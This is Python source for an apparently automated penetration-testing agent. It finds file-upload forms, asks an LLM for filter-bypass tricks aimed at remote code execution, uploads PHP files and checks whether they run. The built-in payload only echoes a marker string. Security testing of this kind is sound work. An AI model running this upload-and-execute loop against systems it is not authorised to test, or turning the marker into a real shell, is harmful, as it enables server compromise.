import logging
from typing import Dict, List, Optional, Tuple
from bs4 import BeautifulSoup
import aiohttp
from urllib.parse import urlparse, urljoin
from bugtrace.agents.base import BaseAgent
from bugtrace.core.config import settings
from bugtrace.core.ui import dashboard
from bugtrace.core.http_orchestrator import orchestrator, DestinationType

logger = logging.getLogger(__name__)

class FileUploadAgent(BaseAgent):
    """
    File Upload Vulnerability Specialist.

    AUTONOMOUS SPECIALIST (v3.1):
    ==============================
    Does NOT rely on DASTySAST for parameter discovery.
    Performs its OWN deep discovery of upload endpoints.

    Discovery Strategy:
    -------------------
    1. HTML Forms: Extracts ALL <input type="file"> with metadata
       - Accept filters (allowed extensions)
       - Multiple file inputs per form
       - All other form fields (hidden, text, etc.)

    2. Drag-and-drop: Detects data-upload attributes, dropzone classes

    3. Metadata Extraction:
       - enctype (multipart/form-data, etc.)
       - Method (POST, PUT)
       - All required fields for successful submission

    Testing Strategy:
    -----------------
    - Phase A: Discover ALL upload endpoints (deduplicated)
    - Phase B: Test each with LLM-guided bypass attempts
    - Max bypass rounds: 5 (extension tricks, magic bytes, etc.)

    Deduplication:
    --------------
    - By upload endpoint URL (not form ID)
    - Prevents testing same endpoint multiple times

    Reference: .ai-context/SPECIALIST_AUTONOMY_ROLLOUT.md
    """
    name = "FileUploadAgent"

    def __init__(self, url: str):
        super().__init__(
            name="FileUploadAgent",
            role="File Upload Specialist",
            agent_id="fileupload_agent"
        )
        self.url = url
        self.found_forms = []
        self.upload_path = None
        self.MAX_BYPASS_ATTEMPTS = 5

        # Deduplication
        self._tested_params = set()  # Legacy (not used)
        self._tested_upload_endpoints = set()  # Track tested upload URLs
        
    async def run_loop(self) -> Dict:
        """
        Main execution loop for FileUpload testing.

        AUTONOMOUS SPECIALIST PATTERN:
        - Phase A: Discover ALL upload forms/endpoints (already deduped)
        - Phase B: Test each form with bypass attempts
        """
        logger.info(f"[{self.name}] 🔍 Initiating AUTONOMOUS File Upload discovery for {self.url}")

        # Phase A: AUTONOMOUS DISCOVERY
        # _discover_upload_forms() now:
        # 1. Extracts ALL upload forms from HTML
        # 2. Detects drag-and-drop zones
        # 3. Extracts accept attributes, all form fields
        # 4. Dedups by endpoint URL
        forms = await self._discover_upload_forms()

        if not forms:
            logger.info(f"[{self.name}] No upload forms found.")
            return {"vulnerable": False, "findings": []}

        logger.info(f"[{self.name}] 🎯 Testing {len(forms)} unique upload endpoints")

        # Phase B: TESTING
        # Note: Dedup already done in _discover_upload_forms via _tested_upload_endpoints
        findings = []
        for form in forms:
            result = await self._test_form(form)
            if result:
                findings.append(result)

        return {
            "vulnerable": len(findings) > 0,
            "findings": findings
        }
        
    async def _discover_upload_forms(self) -> List[Dict]:
        """
        AUTONOMOUS file upload discovery.

        Extracts ALL upload-related endpoints from:
        1. HTML forms with <input type="file">
        2. Accept attributes (allowed extensions)
        3. All form fields (hidden, text, etc.)
        4. Multiple file inputs in same form
        5. Drag-and-drop zones (data-upload, dropzone classes)

        Returns:
            List of upload form dictionaries with rich metadata
        """
        from bugtrace.tools.visual.browser import browser_manager

        try:
            # Use browser to get fully rendered HTML
            state = await browser_manager.capture_state(self.url)
            html = state.get("html", "")

            if not html:
                logger.warning(f"[{self.name}] No HTML content from {self.url}")
                return []

            soup = BeautifulSoup(html, 'html.parser')
            forms = []

            # Extract all forms with file inputs
            for form_idx, form in enumerate(soup.find_all('form')):
                file_inputs = form.find_all('input', {'type': 'file'})
                if not file_inputs:
                    continue

                # Extract action URL
                action = form.get('action', '')
                action_url = urljoin(self.url, action) if action else self.url

                # Dedup check at endpoint level
                if action_url in self._tested_upload_endpoints:
                    logger.info(f"[{self.name}] Skipping duplicate endpoint: {action_url}")
                    continue

                # Extract ALL form fields (not just file inputs)
                all_fields = {}
                for tag in form.find_all(['input', 'textarea', 'select']):
                    field_name = tag.get('name')
                    if field_name:
                        input_type = tag.get('type', 'text').lower()
                        # Skip submit/button but INCLUDE hidden (may be required)
                        if input_type not in ['submit', 'button', 'reset']:
                            all_fields[field_name] = tag.get('value', '')

                # Extract file input details
                file_inputs_metadata = []
                for file_input in file_inputs:
                    file_inputs_metadata.append({
                        'name': file_input.get('name', 'file'),
                        'accept': file_input.get('accept', ''),  # Allowed extensions
                        'multiple': file_input.has_attr('multiple'),  # Multiple files?
                        'required': file_input.has_attr('required')
                    })

                form_data = {
                    'action': action_url,
                    'method': form.get('method', 'POST').upper(),
                    'enctype': form.get('enctype', 'multipart/form-data'),
                    'id': form.get('id', f'form_{form_idx}'),
                    'file_inputs': file_inputs_metadata,
                    'all_fields': all_fields  # Includes hidden, text, etc.
                }

                forms.append(form_data)
                self._tested_upload_endpoints.add(action_url)

            # Also detect drag-and-drop zones (JavaScript upload)
            dropzones = soup.find_all(attrs={'data-upload': True})
            for dz in dropzones:
                upload_url = dz.get('data-upload')
                if upload_url and upload_url not in self._tested_upload_endpoints:
                    forms.append({
                        'action': urljoin(self.url, upload_url),
                        'method': 'POST',
                        'enctype': 'multipart/form-data',
                        'id': dz.get('id', 'dropzone'),
                        'file_inputs': [{'name': 'file', 'accept': '', 'multiple': True, 'required': False}],
                        'all_fields': {},
                        'dropzone': True
                    })
                    self._tested_upload_endpoints.add(upload_url)

            logger.info(f"[{self.name}] 🔍 Discovered {len(forms)} upload forms/endpoints on {self.url}")
            for form in forms:
                file_count = len(form.get('file_inputs', []))
                field_count = len(form.get('all_fields', {}))
                logger.info(f"  → {form['action']} ({file_count} file inputs, {field_count} fields)")

            return forms

        except Exception as e:
            logger.error(f"[{self.name}] Discovery failed: {e}", exc_info=True)
            return []

    def _get_upload_strategy(self, attempt: int, strategy: Optional[Dict], form: Dict) -> Optional[Tuple[str, str, str]]:
        """Get upload strategy from LLM response or fallback."""
        if not strategy or not strategy.get('vulnerable') == 'true':
            if attempt == 0:
                # Fallback strategy for Level 0 if LLM fails or says no
                return ('BT7331_RCE_payload.php', '<?php echo "BT7331_SUCCESS"; ?>', 'application/x-php')
            return None

        filename = strategy.get('filename', 'rce.php')
        payload = strategy.get('payload_content', '<?php echo "BT7331_SUCCESS"; ?>')
        content_type = strategy.get('content_type', 'application/x-php')
        return (filename, payload, content_type)

    def _create_upload_finding(self, filename: str, uploaded_url: str, response_text: str, valid_execution: bool) -> Dict:
        """Create finding dictionary for successful upload."""
        evidence = f"Response confirms upload: {response_text[:100]}"
        if "RCE_FLAG" in response_text:
            evidence = f"RCE Flag Found in response: {response_text}"

        method_desc = "RCE via Execution" if valid_execution else "Arbitrary File Upload (Name Trigger)"
        return {
            "type": "File Upload / RCE",
            "vulnerability": "Unrestricted File Upload / RCE",
            "url": self.url,
            "exploit_url": uploaded_url,
            "filename": filename,
            "confidence": 1.0,
            "method": method_desc,
            "evidence": evidence,
            "validated": True,
            "severity": "CRITICAL",
            "status": "VALIDATED_CONFIRMED",
            "description": f"Unrestricted file upload vulnerability allowing Remote Code Execution. Uploaded malicious file '{filename}' was successfully executed on the server. Method: {method_desc}",
            "reproduction": f"# Upload malicious file:\ncurl -X POST '{self.url}' -F 'file=@{filename}'\n# Access uploaded file:\ncurl '{uploaded_url}'"
        }

    async def _test_form(self, form: Dict) -> Optional[Dict]:
        """
        Orchestrate testing for a specific form with bypass loops.

        Now supports:
        - Multiple file inputs per form
        - Accept attribute awareness (allowed extensions)
        - All form fields (hidden, etc.)
        """
        dashboard.log(f"[{self.name}] Testing upload form: {form['id']}", "INFO")

        # Log accepted extensions if specified
        file_inputs = form.get('file_inputs', [])
        for fi in file_inputs:
            if fi.get('accept'):
                logger.info(f"[{self.name}]   Accept filter: {fi['accept']}")

        previous_response = ""

        for attempt in range(self.MAX_BYPASS_ATTEMPTS + 1):
            if attempt > 0:
                dashboard.log(f"[{self.name}] 🔄 Bypass attempt {attempt}/{self.MAX_BYPASS_ATTEMPTS}", "INFO")

            # Phase 1: Call LLM for strategy (or bypass)
            strategy = await self._llm_get_strategy(form, previous_response)
            strategy_result = self._get_upload_strategy(attempt, strategy, form)

            if not strategy_result:
                break

            filename, payload, content_type = strategy_result
            dashboard.log(f"[{self.name}] Attempting upload: {filename} ({content_type})", "INFO")

            # Phase 2: Execute Upload (test first file input)
            success, response_text, uploaded_url = await self._upload_file(form, filename, payload, content_type)
            previous_response = response_text

            if success:
                # Phase 3: Validate Execution
                valid_execution = await self._validate_execution(uploaded_url)
                valid_upload = f"Uploaded: {filename}" in response_text or "RCE_FLAG" in response_text

                if valid_execution or valid_upload:
                    dashboard.log(f"[{self.name}] 🏆 File Upload Vulnerability CONFIRMED!", "SUCCESS")
                    return self._create_upload_finding(filename, uploaded_url, response_text, valid_execution)
            else:
                dashboard.log(f"[{self.name}] 🛡️ Upload blocked or failed. {len(response_text)} bytes returned.", "WARN")

        return None

    async def _llm_get_strategy(self, form_data: Dict, previous_response: str = "") -> Dict:
        """
        Call LLM to generate or refine the upload bypass strategy.

        Now passes rich metadata:
        - Accept filter (allowed extensions)
        - All form fields (hidden, etc.)
        - Multiple file inputs
        """
        system_prompt = self.system_prompt

        # Extract useful metadata for LLM
        file_inputs = form_data.get('file_inputs', [])
        accept_filters = [fi.get('accept', 'none') for fi in file_inputs]
        all_fields = form_data.get('all_fields', {})

        user_prompt = f"""Analyze this upload form and generate a bypass for RCE:

Form Action: {form_data['action']}
Method: {form_data['method']}
Enctype: {form_data.get('enctype', 'multipart/form-data')}

File Inputs ({len(file_inputs)}):
{chr(10).join([f"  - {fi['name']} (accept: {fi.get('accept', 'any')}, multiple: {fi.get('multiple', False)})" for fi in file_inputs])}

Other Form Fields ({len(all_fields)}):
{chr(10).join([f"  - {name}: {value}" for name, value in list(all_fields.items())[:10]])}

Accept Filters: {', '.join(accept_filters) if accept_filters else 'No restrictions detected'}
"""

        if previous_response:
            user_prompt += f"\n\nPrevious attempt failed with this response:\n{previous_response[:2000]}"
            user_prompt += "\n\nTry a different bypass (e.g. extension change, content-type spoofing, magic bytes, double extensions)."

        from bugtrace.core.llm_client import llm_client
        response = await llm_client.generate(
            prompt=user_prompt,
            system_prompt=system_prompt,
            module_name="FILE_UPLOAD"
        )

        from bugtrace.utils.parsers import XmlParser
        tags = ["payload_content", "filename", "content_type", "vulnerable", "validation_url"]
        return XmlParser.extract_tags(response, tags)

    async def _upload_file(self, form, filename, content, content_type) -> Tuple[bool, str, str]:
        """
        Perform the actual HTTP multipart upload.

        Now includes ALL form fields (hidden, text, etc.) to satisfy
        server-side validation that might reject incomplete forms.
        """
        action_url = form['action']  # Already resolved in _discover_upload_forms
        data = aiohttp.FormData()

        # Add ALL non-file fields first (hidden, text, etc.)
        all_fields = form.get('all_fields', {})
        for field_name, field_value in all_fields.items():
            # Skip file inputs (they're handled separately)
            data.add_field(field_name, field_value)

        # Add the file upload (use first file input)
        file_inputs = form.get('file_inputs', [])
        if file_inputs:
            input_name = file_inputs[0]['name']
        else:
            input_name = 'file'  # Fallback

        data.add_field(input_name,
                      content,
                      filename=filename,
                      content_type=content_type)

        try:
            async with orchestrator.session(DestinationType.TARGET) as session:
                async with session.post(action_url, data=data) as resp:
                    text = await resp.text()
                    # Heuristic: if it's 200/201
                    predicted_url = urljoin(self.url, f"/uploads/{filename}")
                    # Dojo validation: Check if text confirms upload
                    return resp.status in [200, 201], text, predicted_url
        except Exception as e:
            logger.debug(f"[{self.name}] Upload operation failed: {e}")
            return False, "", ""

    async def _validate_execution(self, url: str) -> bool:
        """Check if the uploaded file actually executes code."""
        try:
            async with orchestrator.session(DestinationType.TARGET) as session:
                return await self._check_execution_markers(session, url)
        except Exception as e:
            logger.debug(f"_validate_execution failed: {e}")
            return False

    async def _check_execution_markers(self, session, url: str) -> bool:
        """Check if response contains execution success markers."""
        async with session.get(url) as resp:
            # Guard: 404 means file not accessible
            if resp.status == 404:
                return False
            text = await resp.text()
            return "BT7331_SUCCESS" in text or "RCE_FLAG" in text
